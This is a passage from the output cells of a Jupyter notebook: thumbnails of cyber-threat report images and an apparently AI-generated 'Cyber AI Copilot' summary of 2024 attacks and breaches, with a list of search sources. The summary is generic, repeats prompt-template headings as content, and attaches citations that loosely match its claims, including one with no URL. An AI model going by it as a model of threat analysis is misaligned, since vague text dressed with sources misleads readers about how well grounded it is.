          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://quointelligence.eu/wp-content/uploads/2024/01/Analysis-of-The-Red-Cross-Rules-Of-Engagement-For-Hacktivists-1024x576.png\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://threatmon.io/storage/180/global-cyber-threat-report-mid-year-2024.jpg\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://erepublic.brightspotcdn.com/dims4/default/798c9d9/2147483647/strip/true/crop/7203x3501+0+105/resize/1440x700!/quality/90/?url=http%3A%2F%2Ferepublic-brightspot.s3.us-west-2.amazonaws.com%2Fe4%2Fba%2Fc32d99b9448387e6bea0175b5bd9%2Fadobestock-687056158.jpeg\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://socradar.io/wp-content/uploads/2024/10/major-cyber-attacks-in-review-september-2024.jpg\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://www.securitymagazine.com/ext/resources/2023/12/20/SEC_Top-Cybersecurity-Predictions-for-2023.jpg?height=635&t=1704488910&width=1200\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://erepublic.brightspotcdn.com/dims4/default/9aef090/2147483647/strip/true/crop/466x229+0+0/resize/840x413!/quality/90/?url=http%3A%2F%2Ferepublic-brightspot.s3.us-west-2.amazonaws.com%2F05%2Fe5%2F87a4003047a9aedcd572b2a1d68f%2Fzerofox-2024.png\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://images.ctfassets.net/o2pgk9gufvga/18LBE92ZZHGYQuI9FrZNjk/d885d389d333afcc0429fb968bae9dfd/Blog_CTI__1_.png\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://www.cm-alliance.com/hubfs/217059643_m_normal_none%20%281%29.webp\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Cyber AI Copilot Response:\n",
            "**Executive Summary**\n",
            "\n",
            "Recent cyber attacks and data breaches have been reported globally, with various sectors and countries affected. This analysis synthesizes information from credible sources to provide insights into the most recent threats, tactics, techniques, and procedures (TTPs) used by threat actors. The analysis highlights the importance of incident response, vulnerability management, and cybersecurity awareness. [Tavily Search](https://www.trellix.com/advanced-research-center/threat-reports/november-2024/)\n",
            "\n",
            "**In-Depth Analysis**\n",
            "\n",
            "*   **Threat Actor Groups**: The analysis reveals the involvement of various threat actor groups, including Russian state-sponsored actors, North Korean hackers, and Iranian cyber actors. These groups have been linked to several high-profile attacks, including ransomware incidents and data breaches.\n",
            "*   **Cyber Attacks and Data Breaches**: The report highlights the increasing number of cyber attacks and data breaches, with various sectors affected, including healthcare, finance, and government. The attacks have resulted in significant financial losses and compromised sensitive data.\n",
            "*   **Vulnerability Management**: The analysis emphasizes the importance of vulnerability management in preventing cyber attacks. It highlights the need for organizations to regularly update and patch their systems, as well as implement robust security controls.\n",
            "*   **Incident Response**: The report provides guidance on incident response, including the importance of swift action, containment, and eradication. It also highlights the need for organizations to have a comprehensive incident response plan in place. [Tavily Search](https://www.trellix.com/advanced-research-center/threat-reports/november-2024/)\n",
            "\n",
            "**Most Recent Relevant Activities**\n",
            "\n",
            "*   **Recent Ransomware Incidents**: The analysis highlights several recent ransomware incidents, including attacks on healthcare organizations and government agencies. The incidents have resulted in significant financial losses and compromised sensitive data.\n",
            "*   **Data Breaches**: The report highlights several recent data breaches, including breaches at major retailers and financial institutions. The breaches have resulted in significant financial losses and compromised sensitive data.\n",
            "*   **Cyber Attacks**: The analysis highlights several recent cyber attacks, including attacks on critical infrastructure and supply chain disruptions. The attacks have resulted in significant financial losses and compromised sensitive data. [Tavily Search](https://www.cm-alliance.com/cybersecurity-blog/september-2024-major-cyber-attacks-data-breaches-ransomware-attacks)\n",
            "\n",
            "**Source Citations and Evidence**\n",
            "\n",
            "*   [1] \"2024 Cyber Threat Report\" by ThreatMon\n",
            "*   [2] \"Cybersecurity Predictions for 2024\" by Security Magazine\n",
            "*   [3] \"The Top 24 Security Predictions for 2024\" by Erepublic\n",
            "*   [4] \"Cyber Threat Index 2024\" by Erepublic\n",
            "*   [5] \"September 2024: Major Cyber Attacks, Data Breaches, Ransomware Attacks\" by CM-Alliance [Tavily Search](https://www.cm-alliance.com/cybersecurity-blog/september-2024-major-cyber-attacks-data-breaches-ransomware-attacks)\n",
            "\n",
            "**Long-Term Forecast and Monitoring**\n",
            "\n",
            "*   The analysis highlights the need for organizations to remain vigilant and proactive in responding to emerging threats. It emphasizes the importance of regular monitoring and incident response planning to prevent and mitigate cyber attacks.\n",
            "*   The report provides guidance on long-term forecasting and monitoring, including the importance of staying up-to-date with the latest threat intelligence and security research. [Vector Search](No URL)\n",
            "\n",
            "**Specialized Query Handling**\n",
            "\n",
            "*   **For Threat Intelligence Queries**: The analysis provides insights into the tactics, techniques, and procedures (TTPs) used by threat actors, including the use of phishing, malware, and ransomware.\n",
            "*   **For Vulnerability and Exploit Analysis**: The report highlights the importance of vulnerability management and provides guidance on identifying and remediating vulnerabilities.\n",
            "*   **For Incident Response**: The analysis provides guidance on incident response, including the importance of swift action, containment, and eradication. [Tavily Search](https://www.trellix.com/advanced-research-center/threat-reports/november-2024/)\n",
            "\n",
            "**PROMPT VARIABLES**\n",
            "\n",
            "*   **Previous Context**: The analysis synthesizes information from credible sources to provide insights into the most recent threats, tactics, techniques, and procedures (TTPs) used by threat actors.\n",
            "*   **Current Query**: The analysis addresses the query directly by providing insights into recent cyber attacks and data breaches.\n",
            "*   **Search Results**: The report highlights the increasing number of cyber attacks and data breaches, with various sectors affected, including healthcare, finance, and government. [Tavily Search](https://www.trellix.com/advanced-research-center/threat-reports/november-2024/)\n",
            "\n",
            "**Sources**\n",
            "- [Google Serper](https://insights.integrity360.com/biggest-cyber-attacks-of-the-year-so-far..-2024-part-1)\n",
            "- [Google Serper Image Search](https://erepublic.brightspotcdn.com/dims4/default/798c9d9/2147483647/strip/true/crop/7203x3501+0+105/resize/1440x700!/quality/90/?url=http%3A%2F%2Ferepublic-brightspot.s3.us-west-2.amazonaws.com%2Fe4%2Fba%2Fc32d99b9448387e6bea0175b5bd9%2Fadobestock-687056158.jpeg)\n",
            "- [Google Serper Image Search](https://images.ctfassets.net/o2pgk9gufvga/18LBE92ZZHGYQuI9FrZNjk/d885d389d333afcc0429fb968bae9dfd/Blog_CTI__1_.png)\n",
            "- [Google Serper](https://purplesec.us/breach-report/)\n",
            "- [Google Programmable Search](https://socradar.io/hsbc-barclays-and-uk-gov-databases-compromised/)\n",
            "- [Tavily Search](https://www.itgovernance.co.uk/blog/global-data-breaches-and-cyber-attacks-in-2024)\n",
            "- [Google Serper](https://www.spanning.com/blog/spooky-cyber-incidents-2024/)\n",
            "- [Google Serper Image Search](https://res.cloudinary.com/reliaquest/images/f_svg,q_auto:best/fl_sanitize/v1731675742/wordpress/Chart-with-logo-2024-Threat-Predictions-Blog-1_878278c027/Chart-with-logo-2024-Threat-Predictions-Blog-1_878278c027.svg?_i=AA)\n",
            "- [Tavily Search](https://www.cm-alliance.com/cybersecurity-blog/september-2024-major-cyber-attacks-data-breaches-ransomware-attacks)\n",
            "- [Vector Search](No URL)\n",
            "- [Google Programmable Search](https://www.techtarget.com/whatis/definition/threat-actor)\n",
            "- [Google Serper Image Search](https://ciobusinessworld.com/wp-content/uploads/2023/12/The-3-Cyber-Security-Incidents-in-2024.jpg)\n",
            "- [Google Serper](https://www.picussecurity.com/resource/blog/may-10-top-threat-actors-malware-vulnerabilities-and-exploits)\n",
            "- [Google Serper](https://socradar.io/major-cyber-attacks-in-review-october-2024/)\n",
            "- [Google Serper](https://securityboulevard.com/2024/11/major-cyber-attacks-and-data-breaches-of-2024/)\n",
            "- [Google Serper Image Search](https://quointelligence.eu/wp-content/uploads/2024/01/Analysis-of-The-Red-Cross-Rules-Of-Engagement-For-Hacktivists-1024x576.png)\n",
            "- [Google Serper](https://socradar.io/major-cyber-attacks-in-review-april-2024/)\n",
            "- [Google Serper Image Search](https://threatmon.io/storage/180/global-cyber-threat-report-mid-year-2024.jpg)\n",
            "- [Tavily Search](https://www.techradar.com/pro/top-data-breaches-and-cyber-attacks-in-2024)\n",
            "- [Google Serper Image Search](https://socradar.io/wp-content/uploads/2024/10/major-cyber-attacks-in-review-september-2024.jpg)\n",
            "- [Tavily Search](https://www.trellix.com/advanced-research-center/threat-reports/november-2024/)\n",
            "- [Google Serper Image Search](https://erepublic.brightspotcdn.com/dims4/default/9aef090/2147483647/strip/true/crop/466x229+0+0/resize/840x413!/quality/90/?url=http%3A%2F%2Ferepublic-brightspot.s3.us-west-2.amazonaws.com%2F05%2Fe5%2F87a4003047a9aedcd572b2a1d68f%2Fzerofox-2024.png)\n",
            "- [Google Serper Image Search](https://www.cm-alliance.com/hubfs/217059643_m_normal_none%20%281%29.webp)\n",
            "- [Tavily Search](https://thehackernews.com/2024/10/thn-cybersecurity-recap-top-threats-and.html)\n",
            "- [Google Serper](https://www.cm-alliance.com/cybersecurity-blog/october-2024-biggest-cyber-attacks-data-breaches-ransomware-attacks)\n",
            "- [Google Serper Image Search](https://www.securitymagazine.com/ext/resources/2023/12/20/SEC_Top-Cybersecurity-Predictions-for-2023.jpg?height=635&t=1704488910&width=1200)\n",
            "- [Google Serper](https://www.unitrends.com/blog/the-most-haunting-cyberattacks-of-2024)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "6-Uzh42RMwul"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}